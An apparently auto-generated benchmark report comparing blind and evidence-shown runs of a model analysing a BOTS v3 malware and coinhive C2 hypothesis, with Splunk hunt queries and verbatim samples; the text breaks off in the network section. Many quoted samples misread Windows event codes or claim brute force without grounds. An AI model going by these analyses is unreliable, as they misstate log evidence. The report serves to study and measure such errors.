# Blind vs shown — analyst comparison

- **Run:** `cli-20260823T112627` (`.smartops\runs\cli-20260823T112627\20260823T112855536`)
- **Task / hypothesis id:** `cli-20260823T112627` / `cli-hypothesis`
- **Scope source:** blind_compare.CASES['cli-20260823T112627'] -- scope reconstructed from the run's own fetch plan objectives; hypothesis prose quoted from docs/hard-test.html (not persisted in the run directory)
- **Hypothesis source:** blind_compare.CASES['cli-20260823T112627'] -- scope reconstructed from the run's own fetch plan objectives; hypothesis prose quoted from docs/hard-test.html (not persisted in the run directory)
- **Hypothesis:** Host BSTOLL-L was compromised via PowerShell malware payload e2ac36894c2560d2b277ff9618b76c8c executed by user bostoll, initiating outbound C2 communication to 217.182.164.14 and coinhive.com
- **Samples per arm:** 15
- **Model:** `arn:aws:bedrock:us-east-1:196936075264:imported-model/ft3j2o95okma` temperature=0.6 top_p=0.95 max_gen_len=3072
- **Generated:** 2026-08-25T09:21:50.566426+00:00

## Evidence each domain was shown

| Domain | siem sets | untagged | VT | rows | est. tokens | truncated |
|---|---|---|---|---|---|---|
| identity | 8 | 15 | 0 | 85 | 1927 | no |
| network | 11 | 15 | 3 | 51 | 2329 | no |
| endpoint | 13 | 15 | 2 | 170 | 3758 | no |

## Agreement — between arms vs within each arm

Lexical Jaccard proxies, comparable to each other and not in absolute terms. The decision rule: between-arm agreement below both within-arm floors means the arms differ by more than sampling noise.

| Domain | between (text) | within shown | within blind | between (cites) | verdict |
|---|---|---|---|---|---|
| identity | 0.08 | 0.15 | 0.10 | 0.28 | diverges beyond noise |
| network | 0.12 | 0.17 | 0.12 | 0.38 | diverges beyond noise |
| endpoint | 0.10 | 0.16 | 0.11 | 0.42 | diverges beyond noise |

## Confidence and cost

| Domain | Arm | confidence (min/med/max) | mean observations | stances | failed | prompt tok | gen tok |
|---|---|---|---|---|---|---|---|
| identity | shown | 0.30 / 0.65 / 0.95 | 3.7 | inconclusive:10, refutes:5 | 0/15 | 62013 | 14995 |
| identity | blind | 0.65 / 0.95 / 1.00 | 2.8 | — | 0/15 | 57930 | 16120 |
| network | shown | 0.45 / 0.65 / 0.85 | 1.5 | inconclusive:8, supports:7 | 0/15 | 73785 | 14428 |
| network | blind | 0.65 / 0.95 / 1.00 | 4.3 | — | 0/15 | 73515 | 15341 |
| endpoint | shown | 0.60 / 0.65 / 0.95 | 1.3 | inconclusive:6, refutes:2, supports:7 | 0/15 | 96705 | 13797 |
| endpoint | blind | 0.75 / 0.85 / 1.00 | 1.7 | — | 0/15 | 96405 | 15828 |

## Every sample, verbatim

### identity

**shown #1** — stance `refutes`, confidence 0.95

> No evidence of the specified file hash (e2ac36894c2560d2b277ff9618b76c8c) appearing on BSTOLL-L, nor any records of PowerShell execution or associated malicious activity linked to user bostoll or the described C2 infrastructure. All targeted searches (e.g., uncategorised#4, #6, #7, #14) yielded zero matches.

- User bostoll@froth.ly authenticated successfully from localhost (127.0.0.1) to BSTOLL-L (auth_events#1). [auth_events#1]

citations: `auth_events#1`

**shown #2** — stance `inconclusive`, confidence 0.45

> No authentication evidence cites the specified PowerShell malware hash (e2ac36894c2560d2b277ff9618b76c8c) or the destination IP 217.182.164.14. While user bstoll@froth.ly has multiple successful logons on BSTOLL-L during the timeframe, these do not match the described malicious activity pattern. The absence of these identifiers in all categorized and uncategorized queries prevents conclusive support or refutation.

- User bstoll@froth.ly shows high-volume successful logons (code 4624 type 11) on BSTOLL-L (auth_events#2, auth_events#6).

citations: `auth_events#2, auth_events#6`

**shown #3** — stance `refutes`, confidence 0.85

> The hypothesis describes a specific PowerShell malware execution and subsequent C2 communication, but the evidence lacks any record of the malware hash (e2ac36894c2560d2b277ff9618b76c8c) being executed or the claimed C2 domains/IPs (217.182.164.14, coinhive.com). Auth_events show normal user activity (e.g., 6 successful logins by bstoll@froth.ly), but no indicators of compromise like privilege escalation (EventCode=4672), unauthorized access (EventCode=4625), or post-compromise behavior. Network flows involve 217.182.164.14 but lack authentication context linking it to malicious activity.

- Normal user logins from loopback interface [auth_events#6]
- No malware hash or C2 indicators in network/directory data [uncategorised#12, #13]

citations: `auth_events#1, auth_events#6, uncategorised#12, uncategorised#13`

**shown #4** — stance `inconclusive`, confidence 0.65

> The evidence does not contain authentication events matching the specific indicators claimed in the hypothesis. Key discrepancies include:  
- No entries show user "bostoll" logging into BSTOLL-L (only "bstoll@froth.ly").  
- No event codes indicate PowerShell execution or the specified malware hash (e2ac36894c2560d2b277ff9618b76c8c).  
- No authentication logs reference C2 destinations 217.182.164.14 or coinhive.com.  

While uncategorised#12 and #13 show DNS resolutions for 217.182.164.14 and coinhive.com, these lack contextual links to user activity or compromise. Without correlating authentication events to these IPs/domains, the hypothesis lacks direct support.

- User "bostoll" not found in authentication logs [auth_events#2]
- Malware hash e2ac36894c2560d2b277ff9618b76c8c absent in all logs [auth_events#1, #2, #4–#7, #14]
- Outbound C2 destinations uncorrelated with user sessions [auth_events#6, #12]

citations: `auth_events#2, auth_events#6`

**shown #5** — stance `inconclusive`, confidence 0.65

> No authentication events (e.g., failed attempts followed by success) indicate brute-forcing or password spraying targeting user=bostoll@froth.ly on BSTOLL-L. All logins for this user are successful. Outbound connections to 217.182.164.14 and coinhive.com exist but are not linked to authentication compromises in the evidence. Activity occurs during standard business hours, and no indicators of impossible travel or suspicious geolocations are present.

- Successful logons for user=bstoll@froth.ly (code=4624/logon type=11, code=4624/logon type=7, code=4647) [auth_events#6]
- Failed logons for user=bstoll@froth.ly (code=4624) [auth_events#1]

citations: `auth_events#1, auth_events#6`

**shown #6** — stance `refutes`, confidence 0.85

> The hypothesis claims a host was compromised via PowerShell malware and established C2 communications. However, the authentication evidence shows only legitimate login activities by the user bstoll@froth.ly and system services, with no record of PowerShell execution or active C2 communication to the specified IPs/domains. DNS lookups for coinhive.com and network flows mentioning 217.182.164.14 exist, but they are insufficient to constitute confirmed C2 activity.

- Legitimate logons by bstoll@froth.ly from localhost [auth_events#1, auth_events#4] [auth_events#6]

citations: `auth_events#1, auth_events#4, auth_events#6`

**shown #7** — stance `refutes`, confidence 0.65

> All authentication events show successful logins (code=4624, 4672, 4648, 4611, 4647) without any failures or suspicious patterns like impossible travel, off-hours access, or repeated lockouts. User "bstoll@froth.ly" successfully authenticated multiple times using standard protocols (types 11 and 7), with no evidence of privilege escalation (4672 events) or anomalous destinations/IPs linked to the claimed C2 infrastructure. The hypothesis lacks corroborating evidence such as failed attempts, process executions, or network connections matching the described payload/hash.

- Multiple successful logins by user "bstoll@froth.ly" on BSTOLL-L [auth_events#1]
- All authentication actions are successful [auth_events#2]

citations: `auth_events#1, auth_events#2`

**shown #8** — stance `inconclusive`, confidence 0.45

> The evidence shows multiple successful logins by user bstoll@froth.ly on BSTOLL-L from 127.0.0.1 during business hours with no failed attempts or lockouts ([auth_events#6]). While 217.182.164.14 appears in network streams ([uncategorised#12]), it's classified as normal traffic. Coinhive.com has benign DNS resolution ([uncategorised#13]). Malware hash e2ac36894c... isn't detected in authentication or endpoint events ([auth_events#4], [#uncategorised#4-#7]).

- Routine local logins by bstoll@froth.ly [auth_events#6]

citations: `auth_events#6, uncategorised#12, uncategorised#13`

**shown #9** — stance `inconclusive`, confidence 0.45

> The evidence confirms routine user activity but fails to validate the core claims of malware execution or C2 activity. Absence of hashes, command-line data, or application-layer C2 indicators prevents confirmation.

- No authentication events link to the specified hash (e2ac36894c2560d2b277ff9618b76c8c):
- None of the auth_events rows mention file hashes, process executions, or command-line arguments.
- [auth_events#1], [auth_events#6], and other categories (uncategorised#) lack this critical indicator.
- User activity aligns with normal operations:
- Multiple successful logins (action=success) occur for user=bstoll@froth.ly and BudStoll on BSTOLL-L during the timeframe, with standard event codes (4624 = successful logon). No anomalies (e.g., repeated lockouts, unusual logon types) are present.
- [auth_events#1], [auth_events#2], and [auth_events#6] support this.
- No evidence of C2 communication:
- Traffic to 217.182.164.14 exists ([uncategorised#12]), but it’s categorized as stream: (network flow data) without details on application-layer protocols (e.g., HTTP/S, DNS). No active connections to coinhive.com are recorded in auth_events or uncategorised#.
- Verdict: Inconclusive
- Confidence: 0.45 (Low confidence due to missing critical technical details)
- Rationale: The evidence confirms routine user activity but fails to validate the core claims of malware execution or C2 activity. Absence of hashes, command-line data, or application-layer C2 indicators prevents confirmation.
- OBSERVATIONS:
- User bstoll@froth.ly logged in successfully multiple times on BSTOLL-L ([auth_events#1], [auth_events#2], [auth_events#6]).

citations: `auth_events#1, auth_events#2, auth_events#6, uncategorised#12`

**shown #10** — stance `refutes`, confidence 0.85

> The evidence shows user bostoll@froth.ly successfully authenticated to BSTOLL-L (auth_events#1, #4, #6), but reveals no indicators of compromise:  
- No brute-force/password-spray pattern exists (e.g., multiple failures followed by a success for the user).  
- No privilege escalation attempts (EventCode=4672) are recorded for this user.  
- No C2 activity is attributed to the user:  
  - Outbound communications to 217.182.164.14/coinhive.com occur via service/system accounts (uncategorised#12) unrelated to the user.  
- No malware execution is observed: Uncategorised queries (e.g., #4, #6) fail to link the file hash to the user or BSTOLL-L within the timeline.  

### OBSERVATIONS:  
- User bostoll@froth.ly’s logons lack anomalies (e.g., timing/location inconsistencies).  
- Service/system accounts dominate suspicious network traffic (uncategorised#12, #13).  
- File/hash-based searches yield zero results for the specified malware (e.g., uncategorised#4, #6).  

### CITATIONS:
auth_events#1, #4, #6, uncategorised#12, #13

- User bostoll@froth.ly’s logons lack anomalies (e.g., timing/location inconsistencies).
- Service/system accounts dominate suspicious network traffic (uncategorised#12, #13).
- File/hash-based searches yield zero results for the specified malware (e.g., uncategorised#4, #6).
- ### CITATIONS:
- auth_events#1, #4, #6, uncategorised#12, #13
- VERDICT: refutes
- CONFIDENCE: 0.85
- RATIONALE: The evidence shows routine user logins without behavioral anomalies, C2 attribution to non-user entities, and no forensic traces of malware execution or credential misuse.

citations: `auth_events#1, uncategorised#12`

**shown #11** — stance `inconclusive`, confidence 0.65

> No evidence of the claimed PowerShell malware execution, C2 communication, or privilege escalation, despite verified user logins.

- Verified logins by bstoll@froth.ly with no anomalies ([auth_events#1], [auth_events#6]).

citations: `auth_events#1, auth_events#6`

**shown #12** — stance `inconclusive`, confidence 0.45

> While the evidence contains references to the IP address 217.182.164.14 and the domain coinhive.com (from uncategorised#12 and #13), these occur in benign contexts (network traffic logs and DNS queries) with no indication of malicious activity associated with user bostoll or host BSTOLL-L. The authentication events show no suspicious patterns (failed attempts, impossible travel, off-hours access) for the user or host, nor do they reference the specific malware hash (e2ac36894c2560d2b277ff9618b76c8c) or confirm outbound C2 communication. Absence of direct evidence linking the hash, domains, or C2 behavior to the user/host in the authentication logs renders the hypothesis unverifiable from this dataset.

- Normal login patterns for user bstoll@froth.ly on BSTOLL-L ([auth_events#1], [auth_events#2]).
- Legitimate DNS lookups for coinhive.com ([uncategorised#13]) unrelated to authentication.
- Network traffic to 217.182.164.14 documented but not linked to compromise ([uncategorised#12]).

citations: `auth_events#1, auth_events#2, uncategorised#12, uncategorised#13`

**shown #13** — stance `inconclusive`, confidence 0.30

> No failed logon attempts precede successful authentication, and malware hash searches yielded zero results, contradicting the compromise narrative. [ungrounded: no cited evidence resolved to the provided evidence]

- Key Observation: No evidence links bstoll@froth.ly’s logons to malware execution or malicious C2 activity. Malware hash searches yield 0 results.
- Key Observation: Successful logons occur without preceding failures, contradicting typical attack patterns like brute-force.
- ### Citations:
- Auth_events#6: Validates logins by bstoll@froth.ly.
- Auth_events#2: Shows no failed attempts for bstoll@froth.ly.
- Uncategorised#4–#7: Confirm absence of malware hash in logs.
- ### Verdict:
- The evidence refutes the hypothesis. While authentication occurred, there is no supporting data for malware execution, C2 initiation, or attack precursors (e.g., brute-force attempts).
- VERDICT: refutes
- CONFIDENCE: 0.85
- RATIONALE: No failed logon attempts precede successful authentication, and malware hash searches yielded zero results, contradicting the compromise narrative.
- OBSERVATIONS:

citations: `(none)`

**shown #14** — stance `inconclusive`, confidence 0.45

> The evidence shows user bstoll@froth.ly successfully logging into BSTOLL-L multiple times from localhost (127.0.0.1), which partially aligns with the hypothesis's initial access claim. However, there is no evidence of PowerShell execution (e.g., WinEventLog EventCodes 4688 or Sysmon Event ID 1), the specified malware hash (e2ac36894c2560d2b277ff9618b76c8c), or outbound C2 communications to 217.182.164.14 or coinhive.com. The DNS queries for coinhive.com occurred on other systems, and the external connection to 217.182.164.14 lacks authentication context linking it to BSTOLL-L's compromise.

- User bstoll@froth.ly logged into BSTOLL-L multiple times from localhost ([auth_events#1](https://example.com/auth_events#1), [auth_events#6](https://example.com/auth_events#6)).
- No authentication-related evidence (e.g., EventCodes 4625, 4647, 4672) supports privilege escalation or failed attempts linked to the claimed compromise.
- Missing process execution logs (not in evidence) would confirm PowerShell activity.

citations: `auth_events#1, auth_events#6`

**shown #15** — stance `inconclusive`, confidence 0.65

> Successful logins by user bstoll@froth.ly (as seen in auth_events#1, #2, #4, #6) support initial access, but crucially lack evidence of privilege escalation (code 4672) required for compromise, nor do they demonstrate execution of specified malware hash e2ac36894c2560d2b277ff9618b76c8c or C2 communication to 217.182.164.14/coinhive.com (only uncategorised#12 shows DNS lookups).

- User bstoll@froth.ly logged in twice via code 4624 (auth_events#1, #4) [auth_events#4]
- Multiple successful logins by bstoll@froth.ly (auth_events#6) [auth_events#6]
- No privilege escalation events (code 4672) observed

citations: `auth_events#1, auth_events#4, auth_events#6`

**blind #1**, confidence 0.95

> Repeated successful logons from loopback address suggest potential local testing or suspicious behavior.  

- Successful interactive logons followed by workstation lock events for bstoll@froth.ly.  
  [auth_events#6]  
  - Six code=4624 events followed by three code=4648 (workstation unlocked) events within seconds.

- Multiple successful interactive logons by bstoll@froth.ly from loopback interface (127.0.0.1).
- [auth_events#1]
- Confirmed by two code=4624 events for user=bstoll@froth.ly with src=127.0.0.1.

citations: `auth_events#1, auth_events#6, uncategorised#12, uncategorised#13`

**blind #2**, confidence 0.95

> Multiple failures for a single account within a short timeframe indicate brute-force behavior.

- Brute Force Attempt [auth_events#1]: Two consecutive failed login attempts (Event Code 4624) for user bstoll@froth.ly from localhost (127.0.0.1) to BSTOLL-L.

citations: `auth_events#1`

**blind #3**, confidence 0.95

> Multiple 4624 (interactive logon) and 4648 (workstation unlocked) events occur within seconds/minutes of each other, indicating active user presence. No failed logons or anomalies in geolocation/time-of-day.

- Frequent local interactive logons and workstation unlocks by user bstoll@froth.ly on host BSTOLL-L during a concentrated time window [auth_events#1, #4, #6].

citations: `auth_events#1`

**blind #4**, confidence 0.85

> The evidence shows routine administrative/logon patterns but includes indicators requiring scrutiny: rapid user logons potentially masking session issues, service account overuse, and external communications/network queries suggesting cryptomining or compromise.  

### CITATIONS:  
auth_events#6, auth_events#2, uncategorised#12, uncategorised#13

- Multiple local logons by bstoll@froth.ly on BSTOLL-L [auth_events#6]
- User bstoll@froth.ly performed 4 consecutive successful interactive logons (code=4624) within 10 seconds (2018-08-20T15:35:34.000+02:00–15:35:44.000+02:00). Two originated from localhost (127.0.0.1), while two came from the host itself (BSTOLL-L). This pattern may indicate session re-establishment or brief disconnection.
- Service account activities on BSTOLL-L [auth_events#2]
- Service accounts (e.g., DWM-1, LOCAL SERVICE, NETWORK SERVICE, SYSTEM, UMFD-0, UMFD-1) logged into BSTOLL-L 171 times using code=4624 (successful interactive logon). This is routine for Windows systems but warrants monitoring for anomalies.
- Suspicious outbound network traffic to 217.182.164.14 [uncategorised#12]
- Host BSTOLL-L communicated with 217.182.164.14 via multiple protocols (stream:ip, stream:tcp). This IP is unrelated to user bstoll@froth.ly’s logins but appears in WinEventLog, stream:ip, and stream:tcp logs. Further investigation is needed to assess legitimacy.
- Unusual DNS queries for coinhive.com [uncategorised#13]
- 34 total DNS requests for coinhive.com (via stream:dns) occurred. Coinhive is a known cryptominer service. This may indicate drive-by mining or compromised endpoints, though no direct user activity links exist.
- ### CONFIDENCE: 0.85
- ### RATIONALE:
- The evidence shows routine administrative/logon patterns but includes indicators requiring scrutiny: rapid user logons potentially masking session issues, service account overuse, and external communications/network queries suggesting cryptomining or compromise.
- ### CITATIONS:
- auth_events#6, auth_events#2, uncategorised#12, uncategorised#13

citations: `auth_events#2, auth_events#6, uncategorised#12, uncategorised#13`

**blind #5**, confidence 0.85

> Rapid transition between logon types suggests possible session hopping or opportunistic access patterns.

- User "bstoll@froth.ly" has two identical logon_type=11 events (network logons) occurring simultaneously followed by four workstation logons (logon_type=7) within seconds [auth_events#6]

citations: `auth_events#6`

**blind #6**, confidence 0.95

> All authentication events show normal user and service account activity with no anomalous patterns (brute-force, spray, impossible travel, off-hours access, or lockouts). The only non-authentication-related finding is valid DNS resolution traffic for coinhive.com.

- Legitimate DNS lookups for coinhive.com occurred within the observed time window [uncategorised#13]

citations: `uncategorised#13`

**blind #7**, confidence 0.90

> Evidence shows two failed logons (code=4624) at timestamp 15:35:34.000+02:00, succeeded by another logon attempt at the same timestamp, then a second successful logon at 15:35:44.000+02:00. This sequence aligns with password spraying characteristics.

- [auth_events#1] reports two consecutive failed logon attempts followed immediately by a successful logon for user bstoll@froth.ly from local address 127.0.0.1 to host BSTOLL-L [confidence: 0.9]

citations: `auth_events#1`

**blind #8**, confidence 0.95

> Evidence confirms legitimate user activity (local/remote logons) and baseline service operations. Anomalies involve DNS lookups for known cryptominer domains and connections to an external IP, requiring further investigation.

- Multiple local logons for bstoll@froth.ly: [auth_events#6] shows two logons from 127.0.0.1 with Logon Type 11 (Workstation Unlock).
- Remote logons for bstoll@froth.ly: [auth_events#4] and [auth_events#6] record two remote logons from BSTOLL-L (likely via RDP/SSH) during 2018-08-20T15:35:44Z.
- Service account activity: Numerous successful logons for SYSTEM, LOCAL SERVICE, NETWORK SERVICE, and UMFD accounts ([auth_events#2]). Normal operational noise.
- Suspicious DNS lookups: Uncategorised#13 reveals 28 DNS resolutions for "coinhive.com" within stream:dns logs, suggesting potential cryptomining activity.
- External IP connection: Uncategorised#12 shows three connections between internal IP 192.168.247.131 and external IP 217.182.164.14.

citations: `auth_events#2, auth_events#4, auth_events#6, uncategorised#12, uncategorised#13`

**blind #9**, confidence 0.95

> Two consecutive failed logons (code=4625) immediately preceding a successful logon (code=4624) suggests a possible password brute-force or spray attempt targeting this account.

- User "bstoll@froth.ly" experienced multiple failed logon attempts followed by success [auth_events#1]

citations: `auth_events#1`

**blind #10**, confidence 0.95

> Over 60% of all authentication events involve non-user accounts logging into the host, which could indicate compromised credentials or automation.

- High frequency of service account logons for BSTOLL-L (LOCAL SERVICE, NETWORK SERVICE, SYSTEM, UMFD-0, UMFD-1) [auth_events#2]

citations: `auth_events#2`

**blind #11**, confidence 0.95

> Multiple successful logons by bstoll@froth.ly with consistent localhost sourcing and standard system account activity show typical legitimate behavior. No brute-force/spraying patterns exist (absence of failed logon codes like 4625), impossible travel (geolocation consistency implied), or unusual timing indicated.

- User bstoll@froth.ly authenticated successfully twice from localhost (127.0.0.1) to BSTOLL-L [auth_events#1]
- User bstoll@froth.ly performed workstation unlock (code 4648) followed by interactive logon (code 4624) from localhost [auth_events#6]
- System accounts (DWM-1, LOCAL SERVICE, NETWORK SERVICE, SYSTEM, UMFD-0, UMFD-1) logged into BSTOLL-L without anomalies [auth_events#2]

citations: `auth_events#1, auth_events#2, auth_events#6`

**blind #12**, confidence 0.85

> Traffic to an external IP address suggests potential outbound connections from the system. The three records (two stream:ip, one WinEventLog) confirm network activity toward this destination, which is outside the internal 192.168.247.x range.

- External network connections to 217.182.164.14 occurred [uncategorised#12]

citations: `uncategorised#12`

**blind #13**, confidence 1.00

> The evidence contains no authentication-specific anomalies—brute-force/spraying patterns, impossible travel, unusual timing, or account misuse—all critical indicators of compromise are absent. External connections (217.182.164.14) and DNS queries for coinhive.com exist but fall outside authentication scope.

- No evidence of brute force (multiple failures followed by success) [auth_events#1, auth_events#2]
- No evidence of password spraying (one source failing across multiple accounts) [auth_events#1, auth_events#2]
- No impossible travel (same user logging in from geographically distant locations within minutes) [auth_events#1, auth_events#2]
- No off-hours login activity (all events occur during working hours) [auth_events#1, auth_events#2]
- No disabled account usage observed [auth_events#2]
- No service account misuse patterns detected [auth_events#2]
- No repeated lockout events (all actions are 'success') [auth_events#1, auth_events#2]

citations: `auth_events#1, auth_events#2`

**blind #14**, confidence 0.65

> Multiple successful logons occur in close succession with varying logon types (interactive/network logon), suggesting automated credential testing despite no observed failures.

- User bstoll@froth.ly logged in rapidly (twice) using different authentication methods within seconds [auth_events#6]

citations: `auth_events#6`

**blind #15**, confidence 0.95

> Evidence shows 34 DNS queries for 'coinhive.com' resolving to 217.182.164.14, and three WinEventLog entries showing connections to/from 217.182.164.14 from 192.168.247.131. Coinhive.com is widely recognized as a domain used for cryptocurrency mining, suggesting potential unauthorized resource utilization or system compromise on BSTOLL-L.

- Network activity connecting to a known cryptocurrency mining domain and IP.
- [uncategorised#12, uncategorised#13]

citations: `uncategorised#12, uncategorised#13`

<details><summary>Evidence this domain was shown</summary>

```
# auth_events#1 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4625 OR EventCode=4648 OR EventCode=4672 OR EventCode=4768 OR EventCode=4769 OR EventCode=4771)…" · rows=1
- user=bstoll@froth.ly src=127.0.0.1 dest=BSTOLL-L action=- code=4624 logon_type=11 app=- count=2

# auth_events#2 · query="index=botsv3 (user="bostoll" OR host="BSTOLL-L") (tag=authentication OR tag=login OR sourcetype=WinEventLog) | stats count by sourcetype, EventCode, action, use…" · rows=72
- user=BSTOLL-L$ src=- dest=BSTOLL-L action=success code=4611 logon_type=- app=WinEventLog count=24
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=2
- user=LOCAL SERVICE src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=NETWORK SERVICE src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=SYSTEM src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=163
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=1
- user=bstoll@froth.ly src=- dest=BSTOLL-L action=success code=4624 logon_type=- app=WinEventLog count=4
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=2
- user=LOCAL SERVICE src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=NETWORK SERVICE src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=SYSTEM src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=163
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=1
- user=bstoll@froth.ly src=- dest=BSTOLL-L action=success code=4627 logon_type=- app=WinEventLog count=4
- user=BudStoll src=- dest=BSTOLL-L action=logoff code=4634 logon_type=- app=WinEventLog count=2
- user=BudStoll src=- dest=BSTOLL-L action=success code=4647 logon_type=- app=WinEventLog count=2
- user=DWM-1 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
- user=UMFD-0 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
- user=UMFD-1 src=- dest=BSTOLL-L action=success code=4648 logon_type=- app=WinEventLog count=1
… (52 more rows not shown)

# auth_events#3 · query="index=botsv3 sourcetype=WinEventLog EventCode=4625 host="BSTOLL-L" | stats count by EventCode, user, Logon_Type, Sub_Status, src_ip, Keywords" · rows=0
(no rows returned)

# auth_events#4 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4625 OR EventCode=4648 OR EventCode=4672) host="BSTOLL-L" (user="bstoll@froth.ly" OR user="BudS…" · rows=1
- user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=- count=2

# auth_events#5 · query="index=botsv3 sourcetype=WinEventLog EventCode=4672 host="BSTOLL-L" user="bstoll@froth.ly" | stats count by EventCode, user, host, Keywords, Privilege_List" · rows=0
(no rows returned)

# auth_events#6 · query="index=botsv3 sourcetype=WinEventLog (EventCode=4624 OR EventCode=4648) host="BSTOLL-L" user="bstoll@froth.ly" | table _time, EventCode, user, Logon_Type, src_ip…" · rows=6
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=-
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=127.0.0.1 dest=- action=- code=4624 logon_type=11 app=-
2018-08-20T15:35:34.000+02:00 user=bstoll@froth.ly src=- dest=- action=- code=4648 logon_type=- app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=BSTOLL-L dest=- action=- code=4624 logon_type=7 app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=BSTOLL-L dest=- action=- code=4624 logon_type=7 app=-
2018-08-20T15:35:44.000+02:00 user=bstoll@froth.ly src=- dest=- action=- code=4648 logon_type=- app=-

# auth_events#7 · query="index=botsv3 sourcetype=WinEventLog EventCode=4672 host="BSTOLL-L" | stats count by user, Keywords, Privilege_List" · rows=0
(no rows returned)

# auth_events#8 · query="index=botsv3 sourcetype=WinEventLog EventCode=4624 host=BSTOLL-L user=bstoll@froth.ly | table _time EventCode user Logon_Type src_ip Logon_Process Authenticatio…" · rows=0
(no rows returned)

# uncategorised#1 · query="| tstats summariesonly=t count from datamodel=Authentication where (Authentication.user="bostoll" OR Authentication.src="BSTOLL-L" OR Authentication.dest="BSTOL…" · rows=0
(no rows returned)

# uncategorised#2 · query="index=botsv3 (user="bostoll" OR user="bstoll" OR user="bstoll@froth.ly" OR user="BudStoll") (sourcetype=linux_secure OR sourcetype=syslog OR sourcetype="access_…" · rows=0
(no rows returned)

# uncategorised#3 · query="| tstats summariesonly=t count from datamodel=Endpoint.Processes where Processes.dest="BSTOLL-L" OR Processes.user="bostoll" by Processes.dest, Processes.user, …" · rows=0
(no rows returned)

# uncategorised#4 · query="index=botsv3 host="BSTOLL-L" e2ac36894c2560d2b277ff9618b76c8c earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#5 · query="index=botsv3 host="BSTOLL-L" sourcetype="WinEventLog" source="WinEventLog:Microsoft-Windows-AppLocker/EXE and DLL" earliest=1534723200 latest=1534809600 | stats…" · rows=0
(no rows returned)

# uncategorised#6 · query="index=botsv3 host="BSTOLL-L" "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#7 · query="index=botsv3 "e2ac36894c2560d2b277ff9618b76c8c" earliest=1534723200 latest=1534809600 | stats count by host, sourcetype, source" · rows=0
(no rows returned)

# uncategorised#8 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS by DNS.src, DNS.dest, DNS.query, DNS.answer, DNS.record_type earliest=-1s la…" · rows=0
(no rows returned)

# uncategorised#9 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic by All_Traffic.src, All_Traffic.dest, All_Traffic.dest_port, All_Traffi…" · rows=0
(no rows returned)

# uncategorised#10 · query="| tstats summariesonly=t count from datamodel=Network_Traffic where nodename=All_Traffic (All_Traffic.src="217.182.164.14" OR All_Traffic.dest="217.182.164.14")…" · rows=0
(no rows returned)

# uncategorised#11 · query="| tstats summariesonly=t count from datamodel=Network_Resolution where nodename=DNS (DNS.query="coinhive.com" OR DNS.answer="217.182.164.14") by DNS.src, DNS.de…" · rows=0
(no rows returned)

# uncategorised#12 · query="index=botsv3 (src_ip="217.182.164.14" OR dest_ip="217.182.164.14" OR src="217.182.164.14" OR dest="217.182.164.14") | stats count by sourcetype, src_ip, dest_ip" · rows=3
sourcetype=WinEventLog src_ip=192.168.247.131 dest_ip=217.182.164.14 count=1
sourcetype=stream:ip src_ip=192.168.247.131 dest_ip=217.182.164.14 count=3
sourcetype=stream:tcp src_ip=192.168.247.131 dest_ip=217.182.164.14 count=2

# uncategorised#13 · query="index=botsv3 ("coinhive.com" OR "coinhive") | stats count by sourcetype" · rows=2
sourcetype=stream:dns count=28
sourcetype=syslog count=6

# uncategorised#14 · query="index=botsv3 sourcetype=WinEventLog (src_ip="217.182.164.14" OR dest_ip="217.182.164.14") | stats count by EventCode, src_ip, dest_ip, host, user" · rows=0
(no rows returned)

# uncategorised#15 · query="index=botsv3 sourcetype=syslog "coinhive.com" | stats count by host, src_ip, dest_ip, _raw" · rows=0
(no rows returned)
```

</details>

### network

**shown #1** — stance `inconclusive`, confidence 0.45

> The hypothesis suggests PowerShell malware initiated C2 to 217.182.164.14 and coinhive.com, but evidence shows DNS resolution attempts for coinhive.com subdomains (dns_resolutions#4, #5) and TCP connections to 217.182.164.14 (connections#9). However, no evidence links user bostoll, file hash e2ac36894c2560d2b277ff9618b76c8c, or PowerShell execution to these activities. Uncategorized searches (uncategorised#1-15) fail to find the hash, processes, or authentication events supporting the claim.

- DNS queries for coinhive.com subdomains (dns_resolutions#4, #5) [dns_resolutions#4, #5]
- Outbound connections to 217.182.164.14 (connections#9) [connections#9]

citations: `connections#9, dns_resolutions#4, dns_resolutions#5`

**shown #2** — stance `supports`, confidence 0.65

> Network evidence shows repeated DNS lookups resolving coinhive.com subdomains to 217.182.164.14, followed by high-volume outbound TCP connections to the same IP on port 443. Both the domain and IP have low reputation scores (malicious).

- Connections from BSTOLL-L to 217.182.164.14 on port 443 over multiple timestamps. [connections#9]
- DNS lookups for coinhive.com subdomains from BSTOLL-L resolving to 217.182.164.14. [dns_resolutions#4]

citations: `connections#9, dns_resolutions#4`

